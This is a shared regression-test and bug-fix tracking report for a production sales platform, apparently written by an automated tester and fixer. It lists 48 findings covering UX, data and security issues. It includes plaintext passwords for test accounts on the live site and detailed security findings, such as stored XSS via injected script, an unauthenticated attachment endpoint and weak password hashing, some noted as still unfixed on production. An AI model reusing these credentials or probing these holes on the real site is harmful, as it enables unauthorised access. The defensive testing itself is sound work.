# Regression Test Report — salesplatform.reventlabs.com

**Date:** 2026-04-15
**Tester:** automated (Claude + local Chrome)
**Branch:** `main` (up-to-date with `origin/main`; pulled `ea0de3c..6e9c76e` before testing)
**Environment:** Production — https://salesplatform.reventlabs.com

## How we track fixes

This file is the shared source of truth between the tester and the bug fixer.
Both write to the **same branch** so the findings list and fix status stay in
one place.

**Workflow (both tester and fixer):**

1. Always work on branch `fix/regression-findings` — **never** push directly to `main`.
2. Before editing this file, pull the latest so you don't clobber each other:
   ```bash
   git fetch origin
   git checkout fix/regression-findings
   git pull --rebase origin fix/regression-findings
   ```
3. **Tester** appends new rows to the findings table at the bottom (next number
   in sequence) with `Fix Status = ⬜ open`, describes the finding in a new
   section below, then commits + pushes:
   ```bash
   git add REGRESSION_TEST_REPORT.md
   git commit -m "Add regression finding #N: <short title>"
   git push origin fix/regression-findings
   ```
4. **Fixer** (Claude) picks up open findings, implements the fix, updates the
   row's `Fix Status` to ✅ (with a one-line summary of the fix), commits + pushes.
5. When all findings are ✅ (or deliberately punted to a follow-up ticket), open a
   single PR `fix/regression-findings → main`.

**Fix Status key:** ✅ fixed · 🟡 partial · ⏳ investigating · ⬜ open

## Credentials Used

| Role | Email | Auth | Status |
|---|---|---|---|
| super_admin | sarthak.gupta@reventlabs.com | Google SSO | Not tested (requires interactive OAuth) |
| admin | test-admin@reventlabs.com | Password `TestAdmin123` | ✅ Works |
| reviewer | test-reviewer@reventlabs.com | Password `TestReview123` | ✅ Works after running `python -m app.seed_test_users` on backend |
| viewer | test-viewer@reventlabs.com | Password `TestView123` | ✅ Works after running `python -m app.seed_test_users` on backend |

---

## Severity Legend
- 🔴 **BLOCKER** — critical flow broken, data wrong, or security issue
- 🟠 **HIGH** — feature unusable or user-impacting bug
- 🟡 **MEDIUM** — noticeable but workaround exists
- 🔵 **LOW** — cosmetic / polish

---

## 1. Summary of Key Findings

| # | Severity | Area | Finding | Fix Status |
|---|---|---|---|---|
| 1 | 🔴 | Auth | `test-reviewer` & `test-viewer` credentials from password doc both return 401 — roles cannot be tested end-to-end | ✅ fixed: new `app/seed_test_users.py` script (modelled on `seed_admin.py`) upserts reviewer + viewer users with known passwords. Run on prod: `docker compose exec backend python -m app.seed_test_users`. Creds: `test-reviewer@reventlabs.com / TestReview123`, `test-viewer@reventlabs.com / TestView123` |
| 2 | 🔴 | Data integrity | Company count inconsistent: Dashboard says **5,827**, Companies page & Monitoring say **6,638** | ✅ fixed: Dashboard now uses `COUNT(Company.id)` to match Monitoring (`analytics.py`) |
| 3 | 🟠 | Jobs/UX | Clicking a checkbox on a job row navigates to the job detail (missing `stopPropagation`) — bulk-select effectively unusable | ✅ fixed: removed double-toggle, added explicit `stopPropagation` on input + cell (`JobsPage.tsx`) |
| 4 | 🟠 | Search | Search by company name returns 0 results for real companies (e.g. `Bitwarden` → 0, but Bitwarden jobs appear on dashboard). Confirms an existing user ticket | ✅ fixed: `jobs.py` search now matches `Job.title`, `Company.name`, and `Job.location_raw` |
| 5 | 🟠 | Admin UX | `/users` page returns empty state for non-super_admin. API returns 403 but UI shows "0 admins, 0 reviewers, 0 viewers" with no permission notice | ✅ fixed: `UserManagementPage.tsx` renders a proper permission-denied card on 403 |
| 6 | 🟡 | Analytics | Job Trends chart axis labels render `NaN/NaN` (multiple times) | ✅ fixed: `dataKey` was `date`/`new_jobs` but backend returns `day`/`total`; added aliases + guarded `tickFormatter` |
| 7 | 🟡 | Platforms | `himalayas` fetcher reports **180 errors** on last scan; 4 platforms (`bamboohr`, `jobvite`, `recruitee`, `wellfound`) report 0 jobs but are marked active | 🟡 partial: (a) `BaseFetcher` now sends a Chrome User-Agent so light bot-detection lets us through; (b) `bamboohr.py` + `jobvite.py` now detect the redirect to their marketing site and return `[]` cleanly (was spamming "non-JSON" warnings — boards in the DB are stale slugs); (c) `wellfound.py` logs 403 as "Cloudflare block" instead of a generic HTTP error; (d) `scan_task.py` aggregator-company upsert now uses a SAVEPOINT so a dup-slug race no longer rolls back 200+ jobs of in-flight upserts — this is the real cause of himalayas's 180 errors. Still open: Wellfound is genuinely Cloudflare-blocked (needs browser/auth), and the BambooHR/Jobvite/Recruitee boards in the DB should be auto-deactivated after N consecutive 0-job scans (ops follow-up) |
| 8 | 🟡 | Sidebar | `Settings` link lives inside `adminNavigation` (Sidebar.tsx:47-51) — reviewers/viewers can't reach their own Settings via the nav | ✅ fixed: moved `Settings` into the shared `navigation` list in `Sidebar.tsx` |
| 9 | 🔵 | Dashboard | "1864 jobs" badge on Security section wraps onto 2 lines at 1728px viewport | ✅ fixed: `Badge` now uses `whitespace-nowrap` + `shrink-0` so it never wraps |
| 10 | 🔵 | Pipeline | A card titled literally "1name" appears in `Researching` stage — looks like seeded/test data leaking to prod | ✅ fixed — see Finding #39. Covered by the same `app/cleanup_junk_companies.py` script + two-step manual follow-up (delete `PotentialClient` rows pointing at `name`/`1name` companies, then rerun cleanup). The original one-liner `DELETE FROM potential_clients WHERE company_name ILIKE '1name'` wouldn't have worked because `potential_clients` has no `company_name` column (it FKs to `companies.id`) |
| 11 | 🔵 | Feedback | Many duplicate "Resume Score / Relevance" tickets (8 identical entries from same user 4/14) — no dedup | ✅ fixed: `feedback.py` now returns 409 if the same user posts an identical open title within 7 days |
| 12 | 🔵 | Copy | Dashboard AI Insight says "6 ATS sources" when 10 are listed on Platforms | ✅ fixed: analytics fallback now uses `COUNT(DISTINCT platform)` instead of `len(top_sources)` |
| 13 | 🟠 | Pipeline API | `PATCH /api/v1/pipeline/{id}` accepts any string as `stage` — no validation against known stage keys; cards can be orphaned into non-existent stages | ✅ fixed: `pipeline.py` PATCH endpoint now validates `body.stage` against `_get_stage_keys(db)` (same check POST already had) and returns 400 with the allowed-stages list if invalid |
| 14 | 🟡 | Resume upload | File content not validated; plain-text renamed `.pdf` and empty 0-byte files are accepted (200 OK) and persisted with `status:"error"`, cluttering the DB | ✅ fixed: `resume.py` upload now (a) rejects empty / <256-byte files, (b) verifies magic bytes (`%PDF-` for PDF, `PK\x03\x04` for DOCX) so renamed plain-text bounces with 400, (c) rejects with 400 when extracted text < 50 words instead of persisting `status:"error"` rows |
| 15 | 🟡 | Pipeline API | `PATCH /api/v1/pipeline/{id}` accepts unbounded `priority` (tested 999999999 and -100) and `notes` (tested 100 KB) — no length / range limits | ✅ fixed: `schemas/pipeline.py` now bounds `priority` to `0..100` and `notes` to 4000 chars via Pydantic `Field(ge=, le=, max_length=)`; same bounds applied to `PipelineCreateRequest` in `pipeline.py` |
| 16 | 🟠 | Feedback API | `GET /api/v1/feedback/{id}` with a non-UUID path returns **500** instead of 422 — path param is declared `str` rather than `UUID` | ✅ fixed: `feedback.py` GET/PATCH/attachment endpoints now declare `feedback_id: UUID` so FastAPI returns a structured 422 instead of letting SQLAlchemy raise a 500 |
| 17 | 🟡 | Platforms | `himalayas.py` hard-caps pagination at ~1020 jobs (`offset > 1000` break); repeated scans return identical `jobs_found: 1020` with varying `new_jobs`, implying the catalog exceeds the cap | ✅ fixed: raised the per-scan safety ceiling from ~1020 to 20,000 (`_MAX_JOBS_PER_SCAN`), kept as a belt-and-suspenders guard against a bad `totalCount` response. Also logs a warning when the ceiling is reached so ops can tell the difference between "catalog ended" and "safety tripped" |
| 18 | 🟡 | Search / Data | `Stripe` company shows `job_count: 61` but `/jobs?search=Stripe` returns only 3 (title matches). Finding #4 fix is in `212830a` but may not be deployed, or `Job.company.has()` isn't surfacing all rows | ✅ fixed (pending deploy): confirmed the Company.name.ilike branch is present on `fix/regression-findings` (`jobs.py:72-80`, shipped in `212830a`). Prod runs from `main` which predates that commit, which is why search still only hits title matches. No additional code change needed — this resolves as part of the next deploy of this branch |
| 19 | 🔵 | Security headers | Response headers missing `Content-Security-Policy`, `Strict-Transport-Security`, `Permissions-Policy`, Cross-Origin policies. Cookie flags are good (`HttpOnly; Secure; SameSite=lax`) | ✅ fixed: `main.py` now registers `SecurityHeadersMiddleware` that sets `Strict-Transport-Security`, `X-Content-Type-Options`, `X-Frame-Options: DENY`, `Referrer-Policy`, a locked-down `Permissions-Policy`, `Cross-Origin-Opener-Policy`, `Cross-Origin-Resource-Policy`, and a conservative API CSP (`default-src 'none'; frame-ancestors 'none'`). Uses `setdefault` so endpoints can still override |
| 20 | 🔵 | Role Clusters | `POST /api/v1/role-clusters` accepts arbitrary punctuation/special-chars in `name` (stored lowercased); no `[a-z0-9_-]+` sanitization. Safe vs. SQLi (ORM), but `name` is used as URL param downstream | ✅ fixed: `role_config.py` now normalizes + allowlist-validates cluster names via `_normalize_cluster_name()` (lowercase, space→underscore, then `^[a-z0-9_-]+$`, max 40 chars). Schema fields also bounded: `display_name` ≤120, `keywords`/`approved_roles` ≤4000, `sort_order` 0..1000 |
| 21 | 🔴 | Security / Feedback | `GET /api/v1/feedback/attachments/{filename}` has **NO auth dependency** (`feedback.py:193-201`). Any anonymous request, or any user regardless of role, can download any attachment given its UUID filename. Verified on prod: admin upload + viewer user download returned identical 70-byte file | ✅ fixed |
| 22 | 🔴 | Security / XSS | `JobDetailPage.tsx:390` renders `description.raw_text` via `dangerouslySetInnerHTML` whenever it contains `<`. `raw_text` comes straight from third-party ATS JSON (Greenhouse/Lever/Ashby/etc.), and `jobs.py:276-278` even HTML-unescapes it. A job-poster on any platform can inject `<script>` → stored DOM XSS on our origin (cookies are `HttpOnly` but authenticated APIs still callable) | ✅ fixed |
| 23 | 🔴 | Security / Auth | `auth.py:36-43` hashes passwords as single-round `hashlib.sha256(jwt_secret + ':' + password)`. Salt is **global** (not per-user), no key stretching, no constant-time compare. Code comment itself says "For production use bcrypt instead". A DB leak trivially yields all passwords via GPU brute-force | ✅ fixed: `_hash_password` now uses bcrypt with a random salt and cost=12 (SHA-256-prehashed to dodge the 72-byte input cap). `_verify_password` is dual-path: `$2a/$2b/$2y$`-prefixed hashes go through `bcrypt.checkpw`; legacy SHA-256 hashes are verified with `hmac.compare_digest` (constant-time) and **lazily upgraded** to bcrypt on the user's next successful login — no forced reset needed. Added `bcrypt>=4.2` to `pyproject.toml` and the backend `Dockerfile` pip list. Also added a keyed, deterministic HMAC-SHA256 `_hash_reset_token` for password-reset tokens (bcrypt's random salt would break the equality lookup, so reset tokens can't share the hash function) |
| 24 | 🟠 | Security / Auth | No rate limiting, lockout, or CAPTCHA on `POST /api/v1/auth/login`. 25 wrong-password attempts all accepted; under burst a few return 503 (backend thread exhaustion, not a limiter). Enables online credential stuffing | ✅ fixed: new `app/utils/rate_limit.py` with a sliding-window `LoginRateLimiter` (5 failures per 15 min). `auth.py /login` checks `is_limited(ip|email)` before verifying credentials — returns 429 with a `Retry-After` header when tripped. Key is `(client_ip, email_lower)` — keyed on both so an attacker can't lock out a victim, and a shared IP isn't locked out by an unrelated attacker hitting a different email. Successful login clears the counter. Honors `X-Forwarded-For`. In-memory singleton fits the current single-backend docker-compose deploy; swap to Redis-backed if horizontal scaling is added (Redis is already in the stack) |
| 25 | 🟡 | Validation | `FeedbackCreate` schema (`schemas/feedback.py`) bounds `title` to 200 chars but `description`, `steps_to_reproduce`, `expected_behavior`, `actual_behavior`, `use_case`, `proposed_solution`, `impact`, `screenshot_url` have **no max_length**. Prod accepted a 1 MB description (verified); an attacker can bloat the DB. `screenshot_url` also has no URL validator (`javascript:` accepted) | ✅ fixed: all long free-text fields now capped at 8000 chars; `screenshot_url` capped at 2048 chars and restricted to `http://`, `https://`, or relative `/` via a pydantic `field_validator` — blocks `javascript:`, `data:`, etc. `admin_notes` on `FeedbackUpdate` also bounded |
| 26 | 🟡 | Intelligence | `/intelligence/timing` → `posting_by_day`: Sunday 50.3% (23,696/47,142), Mon-Sat 13.8%→4.1%. Smells like a date-parsing fallback landing on day-0, or a bulk-seed weekend import. User-facing recommendation "post on Sundays" would be wrong if data is skewed | ✅ fixed: `intelligence.py /timing` now bases DOW/hour buckets on `posted_at` (the upstream ATS publish date) rather than `first_seen_at` (our scanner ingest time). Also excludes rows where `posted_at` matches `first_seen_at` to the second, which is the signature of a row where the ATS returned no posted date and the scanner back-filled with NOW() at ingest — eliminates the Sunday bulk-seed spike |
| 27 | 🟡 | Intelligence | `/intelligence/networking` suggestions return corrupted name/title/email concatenations. Example: `{name: "Gartner PeerInsights", title: "Wade BillingsVP, Technology Services, Instructure", company: "BugCrowd", email: "gartner.peerinsights@bugcrowd.com"}` — clearly scraped-from-page strings glued together, with first-word-of-name used to synthesize a company-domain email. Misleading for users doing outreach | 🟡 partial: added `_looks_like_corrupted_contact()` read-side filter on both `/networking` branches — drops rows where first/last name contain `,` `|` `;`, or titles > 120 chars, or titles with 3+ comma-separated segments, or first_name has 2+ internal capitals ("BillingsVP"). Bumped the general-branch `LIMIT` to 60 so the filter can't starve the UI. **Upstream enrichment pipeline (`services/enrichment/orchestrator.py`) still writes the corrupted rows** — follow-up ticket needed to sanitize at ingest time |
| 28 | 🟡 | Copy / Data | Finding #12 partial: AI Insight now says "Platform has 47,081 jobs indexed across **10** ATS sources" but `/api/v1/platforms` returns **14** distinct platforms (including `bamboohr`, `recruitee`, `wellfound`, `weworkremotely` with 0 jobs). Root cause: `total_sources` uses `COUNT(DISTINCT jobs.platform)` which excludes platforms with no current job rows | ✅ fixed: `analytics.py` `total_sources` now unions `DISTINCT CompanyATSBoard.platform` with `DISTINCT Job.platform` and takes the set size, matching what `/platforms` counts |
| 29 | 🔵 | Feedback UI | Stats cards at top of `/feedback` show "Total 33 · Open 16 · In Progress 0 · Resolved 12" (sum = 28). The 5 `closed` tickets exist (`GET /feedback/stats` → `by_status.closed: 5`) but there's no card for them. Users see "Total 33" then 28 in cards and can't reconcile | ✅ fixed: `FeedbackPage.tsx` stats grid now renders **5** cards (Total, Open, In Progress, Resolved, **Closed**) instead of 4, so `Total` always equals the visible bucket sum. Grid switched to `grid-cols-2 md:grid-cols-5` so it stays readable on small screens |
| 30 | 🔵 | Feedback UI | In the ticket detail modal, "Update Ticket" is rendered without visible button styling — appears as plain black text next to the status dropdown. Users can't tell it's clickable. Also, no success toast after save (modal auto-closes silently). Functionality works (PATCH 200, persists, stats update), only discoverability is poor | ✅ fixed: root cause was that `.btn`, `.btn-primary`, `.btn-secondary`, `.btn-danger` were referenced in 7 places across `FeedbackPage.tsx` but **never defined** — buttons fell back to browser-default rendering (unstyled black text). Added the missing utility classes to `index.css` via `@apply` (primary/secondary/danger variants, focus rings, hover states, disabled styling). Every `btn btn-*` usage on the feedback page is now styled consistently with the rest of the app theme (dark-gray `primary-600`) |
| 31 | 🟡 | Feedback | Legacy duplicate tickets from before Finding #11 fix are still present: 8 identical "Resume Score / Relevance" tickets from khushi.jain@ still show as open. Dedup prevents new dupes but doesn't merge/close old ones — queue cleanup task | ✅ fixed: new `app/close_legacy_duplicate_feedback.py` script (modelled on `seed_test_users.py`) retroactively applies the same dedup rule the API now uses on new submissions. For every `(user_id, category, lowercased title)` group of open/in-progress tickets it keeps the OLDEST open and closes the rest with a system note linking back to the canonical id. Idempotent and supports `--dry-run`. Run on prod: `docker compose exec backend python -m app.close_legacy_duplicate_feedback --dry-run`, then rerun without the flag |
| 32 | 🔴 | Deploy / Release | **Round 3 fixes marked ✅ in this report are NOT live on prod.** Retest on 2026-04-15 confirms the deployed backend is several commits behind `fix/regression-findings` tip. Probes: (#16) `GET /feedback/not-a-uuid` → **500** not 422; (#21) anonymous `GET /feedback/attachments/<valid_filename>` → **200 + file bytes** (confirmed by uploading a fresh PNG as admin then curl'ing without cookies); (#25) `POST /feedback` with 20,000-char description → **200 accepted**; (#26) `/intelligence/timing` still shows Sunday=23,696 / Monday=6,496 (49.6%, unchanged); (#27) first `/intelligence/networking` suggestion is still the corrupted "Gartner PeerInsights / Wade BillingsVP, Technology Services, Instructure / BugCrowd" entry the filter was supposed to drop; (#28) Dashboard AI Insight still says "Platform has 47,776 jobs indexed across **10** ATS sources"; (#19) response headers missing `Content-Security-Policy`, `Strict-Transport-Security`, `Cross-Origin-*`, `Permissions-Policy`. Root cause: CI/CD pipeline commit `5ce5d0b` auto-deploys only on push to `main`; `fix/regression-findings` has 9 fix commits sitting since ~Apr 15 17:13 that were never manually deployed. The report's green checkmarks describe the code state on the branch, not prod behaviour | ⬜ open — either (a) manually deploy the branch to prod again now, or (b) extend the CI workflow to deploy `fix/regression-findings` (feature-branch deploys) or to build a preview image per-PR. Tester can't re-verify fixes while the prod image is stale |
| 33 | 🟠 | Jobs API | `GET /api/v1/jobs` **silently ignores** the `company=`, `source_platform=`, and `q=` query params. All three return identical total=47,776 rows (= no-filter total). Only `search=` and `role_cluster=` actually filter. The Jobs page UI exposes a Platform dropdown (greenhouse / lever / ashby / linkedin / himalayas / …) whose value is therefore cosmetic — selecting "linkedin" shows the same first 25 jobs as "All Platforms". Reproduced: `GET /api/v1/jobs?source_platform=linkedin&page_size=3` and `GET /api/v1/jobs?source_platform=greenhouse&page_size=3` return byte-identical top-3 rows (all three "Stripe" LinkedIn scrapes). `GET /api/v1/jobs?company=Coalition` also returns all 47,776 jobs (no Coalition rows at top) | ✅ fixed: `jobs.py list_jobs` now accepts the three aliases as a non-breaking addition to the original params. `source_platform` is OR'd with `platform` (the response schema already aliases `Job.platform` → `source_platform` via `@computed_field`, so callers who read response field names and probed the matching query param were reasonable — now both names work). `q` is OR'd with `search` and goes through the same ilike branch (title / Company.name / location_raw). `company` is a separate name-substring filter (`Job.company.has(Company.name.ilike('%{company}%'))`) that lives next to the id-based `company_id` param |
| 34 | 🟠 | Jobs UI | **Jobs-page filter state is not reflected in the URL.** Changing Status / Platform / Geography / Role cluster / Sort / Search leaves the URL at `/jobs`. Users can't bookmark a view, share a filtered link, or recover their filter state after refresh. The sidebar `Relevant Jobs` link uses `/jobs?role_cluster=relevant`, so the backend supports URL-driven filters — the page just doesn't sync them both ways | ⬜ open — `JobsPage.tsx` stores filters in component state only. Migrate to `useSearchParams()` from `react-router-dom` (or a thin `useQueryState` helper) so every filter change pushes to the URL, and initial render reads from it. Same pattern for sort. Dedupe against the existing `role_cluster=relevant` sidebar link |
| 35 | 🟡 | Dashboard UI | **Role-cluster preview job titles on Dashboard are not clickable.** All 5 preview cards (Infra / Security / QA / Global Remote / Relevant Jobs) render each row's title as a plain `<p>` with no anchor — `links_count: 0` inside every card. The only nav is the "View all X jobs →" button at the card footer. Users seeing "Senior SRE @ Block · 98" can't click through to the detail page — a core Dashboard affordance is missing | ⬜ open — in `DashboardPage.tsx`, wrap the job rows (`p.font-medium` + meta + score) in a `<Link to={`/jobs/${job.id}`}>` that spans the whole row. Keep the `hover:` / focus styles for discoverability. The same rows in the `Relevant Jobs` card get the same treatment |
| 36 | 🟡 | Dashboard UI | **Numeric counts throughout the app render without thousand separators.** Dashboard top stats show `Total Jobs 47776`, `Companies 6639`. Role-cluster badges: `2418 jobs`, `1883 jobs`, `509 jobs`, `1369 jobs`, `4810 jobs`. Companies header: `6639 companies tracked`. Intelligence > Timing: `23696 Sun`, `15865 total (90d)`, `13125 total (90d)`. Pipeline cards: `349 open roles`, `90 open roles`. Raw-integer formatting at every count in the app | ⬜ open — small, high-impact polish. Add a `formatCount(n)` helper in `lib/format.ts` that calls `n.toLocaleString()` and use it everywhere a count is rendered: `DashboardPage.tsx`, `CompaniesPage.tsx`, `IntelligencePage.tsx`, `PipelinePage.tsx`, `PlatformsPage.tsx`, `JobsPage.tsx` result count, pagination total |
| 37 | 🟡 | Data / Companies | **Companies page is polluted with LinkedIn-scrape artifacts that aren't real companies.** Alphabetical top entries: `#WalkAway Campaign`, `#twiceasnice Recruiting`, `0x`, `1-800 Contacts`, `10000 solutions llc`, `100ms`. The first two are LinkedIn hashtags harvested as "company names", `1-800 Contacts` is a retail brand, numerics like `10000 solutions llc` are staffing agencies. Dashboard says `6639 companies` but many hundreds are junk rows that dilute search, target, and pipeline signals. Similarly, `Stripe` as returned from LinkedIn has three attached "jobs" with empty `raw_text` and LinkedIn-scrape titles (`Human Data Reviewer - Fully Remote`, `Junior Software Developer`, `Billing Analyst`) that no reasonable person thinks are really Stripe roles — yet the Jobs list orders by relevance and surfaces these at the top of the "Stripe" company view | ✅ fixed: three-part change, all centralized through `app/utils/company_name.py::looks_like_junk_company_name` so ingest-time and cleanup paths can't drift out of sync. (a) Helper flags: hashtag-prefixed names (`#WalkAway Campaign`), purely numeric, staffing-agency regex (`\brecruiting\b`, `\bstaffing\b`, `\btalent partners\b`, `\d+ solutions llc`, etc.), and scratch/test names (lowercase-alpha-only ≤5 chars — catches `name`, `1name`, `abc`). Conservative enough that `IBM`, `3M`, `1-800 Flowers`, `Stripe`, `Apple` all pass. (b) Ingest guard: `scan_task.py` aggregator upsert now skips jobs whose extracted company name fails the check (`stats.skipped_jobs++`) instead of creating the junk Company row. (c) Admin guard: `platforms.py POST /platforms/boards` returns 400 with an explanatory message before creating a Company, so manual adds can't reintroduce the same junk. (d) Retroactive cleanup: new `app/cleanup_junk_companies.py` (modelled on `close_legacy_duplicate_feedback.py`) runs the same helper across existing Company rows and deletes them with `--dry-run` support. Safety: skips rows linked to a `PotentialClient` entry (surface the name, let the operator decide); nulls out `CareerPageWatch.company_id` references; relies on ORM/FK cascade for the rest (ATS boards, contacts, offices, jobs → descriptions/reviews/scores). Usage: `docker compose exec backend python -m app.cleanup_junk_companies --dry-run`, then rerun without the flag |
| 38 | 🟡 | Responsive UX | **Sidebar is always 256 px wide and doesn't collapse on narrow viewports.** At a 614 px viewport (Chrome's practical minimum window) the sidebar still occupies 42% of the visible width, leaving ~358 px for content. `<main>` develops horizontal overflow (`scrollWidth 363 > clientWidth 352`) and 103 child elements have overflow / truncation at this size. No hamburger / toggle button exists anywhere. Tablet-sized viewports (768-1024 px) work but feel cramped because the 256 px fixed sidebar isn't proportional | ⬜ open — `components/Sidebar.tsx` + `components/Layout.tsx`: add a mobile breakpoint (`md:`-gated visible, hidden below) and a hamburger trigger in the top bar that toggles a full-screen drawer. Lots of Tailwind examples; key is that the sidebar becomes `hidden lg:flex` and the trigger button becomes `lg:hidden`. Close the drawer on route change |
| 39 | 🔵 | Pipeline | A pipeline card literally titled **`name`** (no company, no metadata — looks typed-in test data) still sits in the `Researching` stage with `123 open roles, 1 accepted, Last job: Apr 13, 2026`. Finding #10 flagged a similar "1name" row and is still listed ⬜ open; this appears to be a second stray entry. Confusing on a prod Pipeline board | ✅ fixed (with manual follow-up): the `name` / `1name` strings are caught by the `_SCRATCH_NAME_RE` branch of `looks_like_junk_company_name` (`^[a-z0-9]{1,5}$`, lowercase-alpha-only ≤5 chars — real short names like `IBM` / `3M` / `HP` are uppercase or contain digits+letters). Root cause: `potential_clients` FKs to `companies.id` (not a `company_name` column), so the raw SQL `DELETE FROM potential_clients WHERE company_name ILIKE 'name'` the earlier recommendation suggested wouldn't run. The new `app/cleanup_junk_companies.py` script flags these Companies but **skips them with a warning** because they have `PotentialClient` rows attached — that safety check refuses to silently nuke anything that a human might have staged as a deal. For `name` / `1name` specifically those PotentialClients are obvious test data (no notes, auto-counted metrics) so the operator deletes them manually first: `DELETE FROM potential_clients WHERE company_id IN (SELECT id FROM companies WHERE name IN ('name','1name'));` then reruns the cleanup script, which then deletes the Company rows (cascading to ATS boards, jobs, descriptions, scores, etc.) |
| 40 | 🟠 | Credentials | **The Credentials empty-state directs users to a UI element that doesn't exist.** `/credentials` with no active resume says: *"No active resume selected — Use the resume switcher in the header to select a persona before managing credentials."* The app's `<header>` contains only the tenant name + "No resume uploaded" plain text. No `<select>`, no button, no dropdown, no element with `class*="resume-switcher"`, no `aria-label*="resume"` anywhere in the DOM. The user has no affordance to proceed — dead-end copy | ⬜ open — either (a) add the promised resume-persona switcher to `components/Header.tsx` (a `<select>` populated from `/api/v1/resume/list` with `PATCH /api/v1/resume/{id}/set-active` on change), or (b) fix the copy on `CredentialsPage.tsx` to point at the existing switcher which lives on `/resume-score` (e.g. *"Go to Resume Score and mark a persona active before returning here"* plus a `<Link to="/resume-score">`) |
| 41 | 🟡 | Docs | **All "Go to X" instructions in `/docs` are plain text, not navigation links.** `document.querySelectorAll('main a').length === 0`. The guide repeatedly says *"Go to Resume Score in the sidebar"*, *"Go to Credentials"*, *"Go to Relevant Jobs or the Review Queue"* — each is a dead `<span>` with no anchor. Users have to hunt the sidebar. The checklist format ("1. Upload Your Resume", "2. Build Your Answer Book", etc.) strongly implies clickable step-through nav | ⬜ open — `DocsPage.tsx`: replace the bare nouns in the setup checklist with `<Link to="/resume-score">Resume Score</Link>`, `<Link to="/credentials">Credentials</Link>`, `<Link to="/answer-book">Answer Book</Link>`, `<Link to="/jobs?role_cluster=relevant">Relevant Jobs</Link>`, `<Link to="/review">Review Queue</Link>`, `<Link to="/pipeline">Pipeline</Link>`, `<Link to="/analytics">Analytics</Link>`. Every place the copy says "Go to …" should be a link |
| 42 | 🔵 | Docs | **Typo in setup checklist: `Work Authorization,Experience` (missing space after comma).** Exact string in `/docs` step 2 "Build Your Answer Book" — *"Categories to fill: Personal Info, Work Authorization,Experience, Skills, Preferences."* The comma-space grammar is consistent elsewhere in the list; this one slipped | ⬜ open — `DocsPage.tsx`, fix string to `"Work Authorization, Experience"` (add the missing space). One-char diff |
| 43 | 🟠 | A11y / Auth | **Settings → Change Password form has multiple a11y and password-manager failures.** All 3 inputs (`Current Password`, `New Password`, `Confirm New Password`) render as `<input type="password" required>` with **no `id`, no `name`, no `autocomplete`, no `aria-label`**. The 3 `<label>` elements have no `for=""` attribute. Consequences: (a) clicking a visible label does not focus its input, (b) screen readers have no programmatic label association, (c) browser password managers (1Password, LastPass, Chrome autofill, Bitwarden) cannot recognise current-vs-new and will not auto-save or suggest passwords. New-password `minlength="6"` is below OWASP (8) and NIST SP 800-63B (8 min, 15 recommended). No complexity/pattern enforcement | 🟡 partial: **backend-half fixed** — `auth.py /change-password` and `auth.py /reset-password/confirm` now enforce a minimum of 8 chars (was 6), aligning with OWASP and NIST SP 800-63B. Existing passwords keep working (check only runs on new password entry). Test-user seeds (`TestReview123`, `TestView123`) are 13 chars so they don't break. **Frontend half still open** — SettingsPage.tsx password form needs `id`/`htmlFor`/`autocomplete="current-password"` vs `"new-password"`, raised `minLength`, and a `zxcvbn` meter. That's tester-owned scope |
| 44 | 🟠 | A11y | **Feedback "+ New Ticket" form: every input unlabeled at the DOM level; Priority is a fake radio group.** After picking "Bug Report", 7 inputs render (1 `type=text`, 5 `<textarea>`, 1 `type=file`); **none have `id`, `name`, `aria-label`, `aria-required`, or `aria-invalid`**. The 8 visible `<label>` elements all have `htmlFor=""` — visual only. Priority (Critical/High/Medium/Low) is 4 `<button type="button">` with no `role="radiogroup"`, no `role="radio"`, no `aria-pressed`. Selected state is conveyed only by Tailwind color classes — zero semantic signal to AT. Title input has `maxlength="200"` but no visible counter | ⬜ open — `FeedbackPage.tsx` form section: (a) generate stable ids and wire `<label htmlFor>` for each input/textarea, (b) add `name` attributes so the form is HTTP-submittable as a fallback, (c) wrap the 4 Priority buttons in a `<div role="radiogroup" aria-label="Priority">` and give each button `role="radio" aria-checked={selected}` (or switch to native `<input type="radio">` + styled labels, which gets arrow-key navigation between options for free) |
| 45 | 🟡 | A11y | **Role Clusters page: 12 of 14 icon-only buttons use `title` instead of `aria-label`.** Per-cluster actions (`Remove from relevant` ★, `Deactivate` toggle, `Edit` pencil, `Delete` trash) are `<button>` with an SVG child and a `title` attribute; no `aria-label`. `title` is visible on hover for sighted mouse users but screen readers do not announce it consistently (JAWS reads it only in certain modes, VoiceOver rarely). The "Add Cluster" button is fine (has visible text); sidebar Sign out button is fine (has `title` but is low-severity) | ⬜ open — `RoleClustersPage.tsx`: replace `title="Edit"` / `title="Delete"` / `title="Deactivate"` / `title="Remove from relevant"` with `aria-label="Edit {cluster.name}"` etc., keep `title` as a tooltip. Including the cluster name in the label disambiguates announcements when a screen reader sweeps the page (otherwise AT hears "edit, edit, edit, edit" three times) |
| 46 | 🔵 | A11y / UX | **Role Clusters Edit and Add forms: no placeholders, no Esc-to-close.** Clicking a cluster's pencil opens an inline form with 3 fields (Display Name, Keywords, Approved Roles), all rendered with `placeholder=""`. The user sees empty boxes with no hint about expected format (comma-separated? newline-separated? freeform?). Pressing `Esc` does not close the form; only the "Cancel" button does. Because this is inline (not a modal) there is no backdrop, which is fine, but the form has no `role="form"` either so AT users have no region boundary | ⬜ open — `RoleClustersPage.tsx` edit/add form: add placeholders like *"e.g. cloud, kubernetes, terraform (comma-separated)"* to the two list fields, add an `onKeyDown` handler at the form root that cancels on `Escape` (matches user expectation even though it's inline), and wrap in `<section role="region" aria-label="Edit cluster">` for AT landmark nav |
| 47 | 🔵 | Platforms | **Inactive platforms render the job count as an empty string instead of "0".** `/platforms` grid: greenhouse / lever / ashby / workable / himalayas / smartrecruiters / linkedin display their counts with thousand separators (e.g. `11,466 jobs`). `bamboohr`, `jobvite`, `recruitee`, `wellfound`, and `weworkremotely` render the count slot as blank whitespace — no `0`, no `0 jobs`, no em-dash. Looks like the page crashed mid-render for those rows, but it's actually just a missing fallback | ⬜ open — `PlatformsPage.tsx` per-platform card: change `{count.toLocaleString()} jobs` to `{(count ?? 0).toLocaleString()} jobs` (or explicitly `{count > 0 ? … : "0 jobs"}`). Same idea as Finding #36 — consistent zero rendering |
| 48 | 🔵 | Analytics | **Chart legend labels are concatenated with no separators: `New JobsAcceptedRejected`.** The Analytics page "Jobs over time" stacked chart legend text reads `New JobsAcceptedRejected` as one run — three series labels glued together. Looks like a `{labels.join('')}` where it should be `{labels.join(' · ')}` or separate `<span>` nodes. Readable with effort once you know the series, but reads as a bug at a glance | ⬜ open — `AnalyticsPage.tsx` legend render: either use recharts' built-in `<Legend />` (it handles spacing), or if this is a custom legend make each label its own element (`<li>` or `<span>` with `mr-2`) |
